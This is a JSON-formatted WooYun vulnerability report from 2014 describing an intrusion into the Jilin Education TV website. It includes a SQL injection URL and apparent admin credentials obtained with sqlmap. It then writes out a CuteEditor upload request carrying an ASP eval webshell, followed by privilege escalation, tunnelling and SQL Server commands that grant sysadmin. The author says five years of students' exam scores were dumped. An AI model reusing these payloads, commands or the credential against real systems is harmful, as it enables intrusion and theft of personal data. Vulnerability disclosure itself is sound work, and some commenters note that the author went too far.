{"id": 1949, "wybug_id": "wooyun-2014-067530", "wybug_title": "吉林教育电视台后台getshell可提权拖库致2010-2014年5年高考成绩泄露", "wybug_corp": "吉林教育电视台", "wybug_author": "老迷糊飞侠", "wybug_date": "2014-07-05 17:55", "wybug_open_date": "2014-08-19 17:56", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-19：\t细节向公众公开  简要描述： 吉林教育电视台后台getshell，可提权拖库，致2010-2014年5年高考成绩和录取信息泄露 详细说明：  先是前台一个SQL注入：\nhttp://www.jletv.cn/program_show_list.aspx?nid=11811\nnid参数过滤不严，用sqlmap跑出后台用户名密码adminjugaohuang^$后台地址\nhttp://www.jletv.cn/admin\n进去之后发现几个图片上传点都对文件类型进行了限制，看了看编辑器，用的是CuteEditor\n\nCuteEditor前几天刚爆出的脚本上传漏洞，在IIS6下可以getshell\nPOST http://www.jletv.cn/CuteSoft_Client/CuteEditor/uploader.ashx?_Addon=xhttp&_AddonGuid=e7d8104a-0ba6-4b47-8285-59d442e2b7d3&_PartialStart=0&_PartialFileName=1.asp; HTTP/1.1Content-Length: 28 PCVldmFsIHJlcXVlc3QoImEiKSU+\nPOST过去之后得到小马\nhttp://www.jletv.cn/uploadertemp/uploading.e7d8104a-0ba6-4b47-8285-59d442e2b7d3.1.asp;.resx?a=response.write%28%22hehe%22%29\n\n\n用菜刀连接，上传大马\n\n巴西烤肉提权\n\n添加管理用户后发现3389端口没有开，修改注册表把3389打开蛋疼的是3389被墙了，换成21什么的也不行然后想到用reDuh建立http隧道\n\n隧道建立成功，用远程桌面连接127.0.0.1:1234可进行操作打开 SQL Server Management Studio发现没有权限。。。 -_-!在cmd中执行 net stop mssqlserver 停掉MSSQL再执行 C:\\Program Files\\Microsoft SQL Server\\MSSQL10.MSSQLSERVER\\MSSQL\\Binn\\sqlserver.exe /m /f 启用单用户模式打开SSMS新建查询，这时Windows身份认证已经可以用了执行以下代码：\n--创建登录名CREATE LOGIN [jletv-sql\\ASP.NET] FROM WINDOWS;GO--赋予登录名的权限为sysadminUSE masterGOEXEC [sys].[sp_addsrvrolemember] @loginame = 'jletv-sql\\ASP.NET', -- sysname    @rolename = sysadmin -- sysname\n把当前用户加到SQL Server中，得到了数据库权限，拖库成功10-14年的高考考生成绩，录取信息都可以查得到\n\n\n\n\n\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  前台的SQL注入要加强过滤编辑器的问题：向[CuteEditor]CuteEditor.b::f(string):string方法定义的非法字符列表中添加分号最重要的是要重视网站的安全   版权声明：转载请注明来源 老迷糊飞侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-07-09 22:01 厂商回复： CNVD确认并复现所述情况(仅复现第一层风险)，已经转由CNCERT下发给吉林分中心处置。按多个风险点及信息泄露风险评分，rank 16 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-05 17:56 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  电视台跟高考成绩有什么关系？    \n     2014-07-05 18:14 |    \t\t老迷糊飞侠 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:2        | 菜鸟一枚。。)\t\t \n  @魇 高考成绩可以在这个电视台的网站上查到    \n     2014-07-05 18:41 |    \t\tIT偏执狂 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 禁锢我们的究竟是什么？)\t\t \n  这样也可以。。    \n     2014-07-05 18:46 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  ——、我觉得太不科学了。。     \n     2014-07-05 18:47 |    \t\tJack.Chalres \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:15        | ..............)\t\t \n  这样也可以。。    \n     2014-07-05 23:13 |    \t\t魂淡、 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 么么哒)\t\t \n  有点略屌。。。JJFLY...    \n     2014-07-06 00:13 |    \t\tRinima \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        )\t\t \n  这种类似的貌似还真挺多。而且貌似都已经被……了    \n     2014-07-06 10:20 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  我觉得你这个玩的有的过头了    \n     2014-08-19 18:12 |    \t\t中国公民 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:12        | 脱裤不提交，提交不脱裤)\t\t \n  把当前用户加到SQL Server中，得到了数据库权限，拖库成功在cmd中执行 net stop mssqlserver 停掉MSSQL这两句话吓死我了。    \n     2014-08-19 18:13 |    \t\tby灰客 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:12        )\t\t \n  你们为毛都去玩它- -顺便求一份    \n     2014-08-19 20:32 |    \t\t小森森 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 不中二 枉少年)\t\t \n  学习了。。。    \n     2014-08-19 20:43 |    \t\tTixe \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        )\t\t \n  好吧！无聊……    \n     2014-08-19 20:54 |    \t\t浩森 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:6        )\t\t \n  这是在挖洞？这尼玛就是脱裤啊 ，洞主还活着么    \n     2014-08-19 21:53 |    \t\tphantomer \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:4        | 菜比一个。求勿喷。)\t\t \n  是脱裤拖偏了吧。。。哈哈`(*∩_∩*)′    \n     2014-08-19 22:23 |    \t\t瓦解° \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:5        | web渗透学习小菜一枚。)\t\t \n  洞主的奇淫技巧真不少。。    \n     2014-08-20 07:59 |    \t\t树上草 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:8        | <img height=\"12\" width=\"12\" style=\"verti...)\t\t \n  咳咳，是不是该把裤子丢出来了    \n     2014-08-22 04:42 |    \t\t小小丶 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 小小酱油一个。)\t\t \n  啊啊 我也拿下了 开始在乌云没号 提交360 只给我 3积分 感觉坑死了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}